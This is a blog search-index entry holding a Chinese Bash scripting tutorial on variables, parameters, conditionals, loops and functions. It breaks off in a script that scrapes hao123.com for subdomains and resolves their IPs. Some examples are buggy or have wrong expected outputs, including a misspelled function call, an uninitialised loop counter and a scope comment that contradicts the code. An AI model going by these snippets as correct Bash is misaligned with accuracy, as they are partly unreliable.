<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Bash脚本学习</title>
      <link href="/2023/10/20/Bash%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/10/20/Bash%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="bash-脚本"><a href="#bash-脚本" class="headerlink" title="bash 脚本"></a><code>bash</code> 脚本</h1><hr><blockquote><p>Bash 脚本是一个纯文本文件，包含一系列命令，这些命令被执行时就像在终端提示符下键入一样。一般来说，Bash 脚本的可选扩展名是.sh（以便于识别），以<code>#!/bin/bash</code> 开头，并且必须设置可执行权限才能执行。</p></blockquote><h2 id="脚本格式"><a href="#脚本格式" class="headerlink" title="脚本格式"></a>脚本格式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># #!/bin/bash</span></span><br><span class="line"><span class="comment"># 打印&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于变量值包含空格的，用 &quot;&quot; &#x27;&#x27; ``包裹起来，但一般不要用反括号，容易和命令替换冲突。</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure><p>这个脚本有几个值得解释的组成部分：</p><ul><li>第 1 行：#!通常被称为 shebang，被 Bash 解释器忽略。第二部分，&#x2F;bin&#x2F;bash，是解释器的绝对路径，用于运行脚本。这使得它成为一个“Bash 脚本”，而不是其他类型的 shell 脚本，比如“C Shell 脚本”。</li><li>第 2 行：#用于添加注释，因此跟在后面的所有文本都被忽略。</li><li>第 3 行：echo “Hello World!”使用 echo Linux 命令工具将给定的字符串打印到终端，本例中为“Hello World”。</li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量声明方式"><a href="#变量声明方式" class="headerlink" title="变量声明方式"></a>变量声明方式</h3><blockquote><p>我们可以以多种方式声明变量值。最简单的方法是使用简单的 name&#x3D;value 声明来设置值。请注意，在“&#x3D;”符号之前或之后没有空格。使用变量只需要在变量前添加$。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">name=value</span><br><span class="line">first_name=hack</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$first_name</span></span><br></pre></td></tr></table></figure><p>命令替换</p><blockquote><p>使用<code>name=$(command)</code>可以将命令的结果保存在变量中。命令替换的另一种语法反引号方法较旧，通常不推荐使用，因为这两种命令替换方法的行为方式存在差异。值得注意的是，命令替换发生在子 shell 中，对子 shell 中的变量进行的更改不会影响主进程的变量。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash -x</span></span><br><span class="line"><span class="comment"># -x 这指示 Bash 打印额外的调试输出，以便我们更容易地查看执行的命令及其结果。</span></span><br><span class="line"><span class="comment"># 再次 $() 和 `` 作用相等。所以如果用``包裹字符串可能会出问题。</span></span><br><span class="line">name=$(<span class="built_in">whoami</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$name</span></span><br><span class="line">name=`<span class="built_in">whoami</span>` <span class="comment"># 反括号方法</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$name</span></span><br><span class="line"><span class="comment"># 这个命令发生在子shell中，所以name的值不会被修改</span></span><br><span class="line">$(name=123)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$name</span></span><br></pre></td></tr></table></figure><h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h3><p>变量的作用域指的是变量的有效范围。默认情况下，变量具有全局作用域，意味着可以在整个脚本中访问。相反，局部变量只能在定义它的函数、代码块或子 shell 中可见。我们可以使用 local 关键字将全局变量“覆盖”，使其具有局部上下文，而不影响全局变量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改全局变量name</span></span><br><span class="line"><span class="function"><span class="title">change_var_name</span></span> () &#123;</span><br><span class="line"> name=<span class="string">&quot;kali&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用local 来覆盖全局变量name</span></span><br><span class="line"><span class="function"><span class="title">change_local_var_name</span></span> () &#123;</span><br><span class="line"> <span class="built_in">local</span> name=<span class="string">&quot;kali&quot;</span> <span class="comment"># 此时的name只是一个函数内的局部变量</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;kali&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_var_name</span></span> () &#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;func-<span class="variable">$name</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">name=<span class="string">&quot;bob&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;main-<span class="variable">$name</span>&quot;</span> <span class="comment"># echo: main-bob</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数后, 用local覆盖全局变量name, 然后修改</span></span><br><span class="line"><span class="comment"># 只是修改了局部变量name值, 全局变量name不变。</span></span><br><span class="line">change_local_var_name <span class="comment"># echo: kali</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数后, 在函数内部修改了全局变量name值, 后面不管在哪调用</span></span><br><span class="line"><span class="comment"># name的值都发生了改变。</span></span><br><span class="line">change_var_name</span><br><span class="line"></span><br><span class="line">get_var_name <span class="comment"># echo: func-bob</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 1)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;block_code-<span class="variable">$name</span>&quot;</span> <span class="comment"># echo: block_code-bob</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">(<span class="built_in">echo</span> <span class="string">&quot;subshell-<span class="variable">$name</span>&quot;</span>) <span class="comment"># echo: subshell-bob</span></span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>获取参数的方法</p><table><thead><tr><th align="left">变量名称</th><th>描述</th></tr></thead><tbody><tr><td align="left">$0</td><td>Bash 脚本的名称</td></tr><tr><td align="left">$1-$9</td><td>Bash 脚本的前 9 个参数</td></tr><tr><td align="left">$#</td><td>传递给 Bash 脚本的参数数量</td></tr><tr><td align="left">$@</td><td>传递给 Bash 脚本的所有参数</td></tr><tr><td align="left">$?</td><td>最近运行的进程的退出状态</td></tr><tr><td align="left">$$</td><td>当前脚本的进程 ID</td></tr><tr><td align="left">$USER</td><td>运行脚本的用户的用户名</td></tr><tr><td align="left">$HOSTNAME</td><td>机器的主机名</td></tr><tr><td align="left">$RANDOM</td><td>一个随机数</td></tr><tr><td align="left">$LINENO</td><td>脚本中的当前行号</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本执行 &lt;name&gt;.sh hello world I am hack</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;执行用户@主机名(PID:EXIT STATUS)&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$USER</span>@<span class="variable">$HOSTNAME</span>($$:$?)-&gt; <span class="variable">$0</span> <span class="variable">$1</span>,<span class="variable">$2</span>! <span class="variable">$3</span> <span class="variable">$4</span> <span class="variable">$5</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;run this programe, i got <span class="variable">$#</span> args, current lineno: <span class="variable">$LINENO</span>&quot;</span></span><br></pre></td></tr></table></figure><h2 id="读取用户输入"><a href="#读取用户输入" class="headerlink" title="读取用户输入"></a>读取用户输入</h2><p>使用 <code>read</code> 获取用户输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -p 允许我们自己预设提示</span></span><br><span class="line"><span class="comment"># -s 选项用于在读取输入时隐藏输入的字符</span></span><br><span class="line"><span class="comment"># -r 选项来禁止对反斜杠进行转义</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y/N?&quot;</span></span><br><span class="line"><span class="built_in">read</span> answer</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;input your&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;username: &quot;</span> username</span><br><span class="line"><span class="built_in">read</span> -rsp <span class="string">&quot;password: &quot;</span> password</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$answer</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$username</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$password</span></span><br></pre></td></tr></table></figure><h2 id="条件控制语句"><a href="#条件控制语句" class="headerlink" title="条件控制语句"></a>条件控制语句</h2><blockquote><p>条件控制语句的使用要注意格式</p></blockquote><table><thead><tr><th>运算符</th><th>描述 表达式为真的条件</th></tr></thead><tbody><tr><td><code>!EXPRESSION</code></td><td>EXPRESSION 为假。(取反)</td></tr><tr><td><code>-n STRING</code></td><td>字符串 STRING 的长度大于零。</td></tr><tr><td><code>-z STRING</code></td><td>字符串 STRING 的长度为零（空）。</td></tr><tr><td><code>STRING1 != STRING2</code></td><td>字符串 STRING1 不等于 STRING2。</td></tr><tr><td><code>STRING1 = STRING2</code></td><td>字符串 STRING1 等于 STRING2。</td></tr><tr><td><code>INTEGER1 -eq INTEGER2</code></td><td>整数 INTEGER1 等于 INTEGER2。</td></tr><tr><td><code>INTEGER1 -ne INTEGER2</code></td><td>整数 INTEGER1 不等于 INTEGER2。</td></tr><tr><td><code>INTEGER1 -gt INTEGER2</code></td><td>整数 INTEGER1 大于 INTEGER2。</td></tr><tr><td><code>INTEGER1 -lt INTEGER2</code></td><td>整数 INTEGER1 小于 INTEGER2。</td></tr><tr><td><code>INTEGER1 -ge INTEGER2</code></td><td>整数 INTEGER1 大于等于 INTEGER2。</td></tr><tr><td><code>INTEGER1 -le INTEGER2</code></td><td>整数 INTEGER1 小于等于 INTEGER2。</td></tr><tr><td><code>-d FILE</code></td><td>文件 FILE 存在且为目录。</td></tr><tr><td><code>-e FILE</code></td><td>文件 FILE 存在。</td></tr><tr><td><code>-r FILE</code></td><td>文件 FILE 存在且具有读权限。</td></tr><tr><td><code>-s FILE</code></td><td>文件 FILE</td></tr></tbody></table><blockquote><p>其中(<code>[</code>和<code>]</code>)实际上是对<code>test</code>命令的引用, 所以可以省略并用<code>test</code>命令代替。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if 的使用</span></span><br><span class="line"><span class="keyword">if</span> [ $(<span class="built_in">whoami</span>) = <span class="string">&quot;kali&quot;</span> ] <span class="comment"># 等价于 if test $(whoami) = &quot;kali&quot;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Hello, kali&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># else 的使用</span></span><br><span class="line"><span class="keyword">if</span> [ $(<span class="built_in">whoami</span>) = <span class="string">&quot;kali&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Hello, kali&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;You are not kali&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elif 的使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># else 的使用</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $(<span class="built_in">whoami</span>) = <span class="string">&quot;kali&quot;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Hello, kali&quot;</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">test</span> $(<span class="built_in">whoami</span>) = <span class="string">&quot;root&quot;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Hello, root&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;You are not my user&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h2 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h2><p>布尔运算符号: <code>&amp;&amp;</code> 和 <code>||</code></p><blockquote><p>布尔逻辑运算符根据前一个命令是否成功执行（或返回 True 或 0）或失败（返回 False 或非零值）来执行命令。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;&amp; 在前一个命令执行成功是就会执行后一个命令</span></span><br><span class="line">user1=kali</span><br><span class="line">grep <span class="variable">$user1</span> /etc/passwd &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user1</span> found!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当grep命令执行成功时，下一个命令才会执行，在此，grep未检索到 bob 所以后一个命令不会执行。</span></span><br><span class="line">user2=bob</span><br><span class="line">grep <span class="variable">$user2</span> /etc/passwd &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user2</span> found!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># || 和 &amp;&amp; 相反在前一个命令执行失败后才会执行后一个命令</span></span><br><span class="line">user3=many</span><br><span class="line">grep <span class="variable">$user3</span> /etc/passwd &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user3</span> found!&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user3</span> not found!&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>tips: <code>test</code> 是不支持逻辑运算符<code>&amp;&amp;</code> 和 <code>||</code> 的所以需要使用 <code>[]</code> 来进行条件测试。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$USER</span> = <span class="string">&quot;kali&quot;</span> ] || [ <span class="variable">$HOSTNAME</span> = <span class="string">&quot;kali&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;you are right!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;not my user!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$USER</span> = <span class="string">&quot;kali&quot;</span> ] &amp;&amp; [ <span class="variable">$HOSTNAME</span> = <span class="string">&quot;kali&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;you are right!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;not my user!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for &lt;var&gt; in &lt;list&gt;</span></span><br><span class="line"><span class="comment"># do</span></span><br><span class="line"><span class="comment">#   &lt;loops&gt;</span></span><br><span class="line"><span class="comment"># done</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 10)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;192.168.110.<span class="variable">$ip</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while &lt;test&gt;</span></span><br><span class="line"><span class="comment"># do</span></span><br><span class="line"><span class="comment">#   &lt;loops&gt;</span></span><br><span class="line"><span class="comment"># done</span></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$count</span> &lt;= <span class="number">10</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;192.168.110.<span class="variable">$count</span>&quot;</span></span><br><span class="line">  ((count++))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="关于-和-的用法和区别"><a href="#关于-和-的用法和区别" class="headerlink" title="关于 $(()) 和 (()) 的用法和区别"></a>关于 <code>$(())</code> 和 <code>(())</code> 的用法和区别</h2><p><code>$(())</code> 和 <code>(( ))</code> 是在 Bash 中用于进行算术运算的两种语法形式，它们的功能相似，但在使用上有一些区别。</p><ol><li><p><code>$(())</code>：这是一种用于算术展开的语法形式。它通常用于将算术表达式的结果赋值给变量或输出到标准输出。例如：</p><ul><li><code>result=$(($num1 + $num2))</code>：将 <code>$num1</code> 和 <code>$num2</code> 的值相加，并将结果赋值给 <code>result</code> 变量。</li><li><code>echo $(($var1 * 2))</code>：将变量 <code>$var1</code> 的值乘以 2，并将结果输出到标准输出。</li><li><code>echo $((2#01101))</code>：计算二进制数<code>01101</code>的十进制值，并将结果输出到标准输出。</li></ul></li><li><p><code>(( ))</code>：这是一种用于进行算术运算和逻辑运算的语法形式。它通常用于条件语句或循环中的数值比较和计算。例如：</p><ul><li><code>if (( $num1 &gt; $num2 )); then ... fi</code>：在条件语句中比较 <code>$num1</code> 和 <code>$num2</code> 的值。</li><li><code>((counter++))</code>：递增 <code>counter</code> 变量的值。</li></ul></li></ol><p>总结：</p><ul><li><code>$(())</code> 用于算术展开，适用于赋值和输出操作。</li><li><code>(( ))</code> 用于算术运算和逻辑运算，适用于条件语句和循环等场景。</li></ul><p>需要注意的是，在使用这些语法形式时，变量名前面的 <code>$</code> 符号是可选的，取决于具体的使用情况。</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数创建的两种方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> function_name &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">function_name_2</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_name</span><br><span class="line">fcuntion_name_2</span><br></pre></td></tr></table></figure><blockquote><p>在其他编程语言中，比如 C 语言，这些括号通常用于定义参数，但在 Bash 中，这些括号只是装饰性的，实际上并不使用。</p></blockquote><p>函数参数获取方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $1-$9 Bash 脚本的前 9 个参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> function_name &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello world, <span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">function_name_2</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello world, <span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_name <span class="variable">$RANDOM</span></span><br><span class="line">fcuntion_name_2 100</span><br></pre></td></tr></table></figure><blockquote><p>实际上，Bash 函数并不像传统意义上的函数那样允许你返回任意值。相反，Bash 函数可以返回一个退出状态（成功为零，失败为非零），或者其他任意值，我们可以通过 <code>$?</code> 全局变量来获取。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> function_name &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello world, <span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="comment"># 可以通过return 一个整数来更改函数返回值。</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$RANDOM</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">function_name_2</span></span> () &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello world, <span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_name <span class="variable">$RANDOM</span></span><br><span class="line"><span class="comment"># 通过$? 可以获取函数返回值(退出状态)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;上一函数的返回值为: $?&quot;</span> <span class="comment"># $? == $RANDOM</span></span><br><span class="line">function_name_2 100</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;上一函数的返回值为: $?&quot;</span> <span class="comment"># $? == 100</span></span><br></pre></td></tr></table></figure><h2 id="bash代码示例"><a href="#bash代码示例" class="headerlink" title="bash代码示例"></a><code>bash</code>代码示例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们想要找出主要网页 https://www.hao123.com/ 上列出的所有子域名，并找出它们对应的 IP 地址。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[33mGET WEB PAGE...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line">curl -o <span class="string">&quot;index.html&quot;</span> <span class="string">&quot;https://www.hao123.com/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[33mGET ALL URL...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不使用正则表达式, 繁琐、运行慢而且精度不够。</span></span><br><span class="line"><span class="comment">#for i in $(awk -F &quot;://&quot; &quot;&#123;print $1&#125;&quot; index.html)</span></span><br><span class="line"><span class="comment">#do</span></span><br><span class="line"><span class="comment">#  echo $i | grep &quot;\.hao123\.com&quot; | grep -v &quot;www\.hao123\.com&quot; | cut -f 3 -d &quot;/&quot; | grep &quot;\.hao123\.com&quot; | cut -f 1 -d &quot;?&quot; | cut -f 1 -d &quot;\&quot;&quot; &gt;&gt; url.txt</span></span><br><span class="line"><span class="comment">#done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[33mPROCESS URL TXT&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line"><span class="comment"># sort -u url.txt &gt; url_uniq.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用正则匹配: [^/,F,&quot;] 不匹配 / F &quot;三个字符</span></span><br><span class="line">grep -o <span class="string">&#x27;[^/,F,&quot;]*\.hao123\.com&#x27;</span> index.html | grep -v <span class="string">&quot;www&quot;</span> | <span class="built_in">sort</span> -u &gt; url_uniq.txt</span><br><span class="line"><span class="built_in">cat</span> url_uniq.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[33mUSE HOST COMMAND GET URL IP ADDRSS...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span 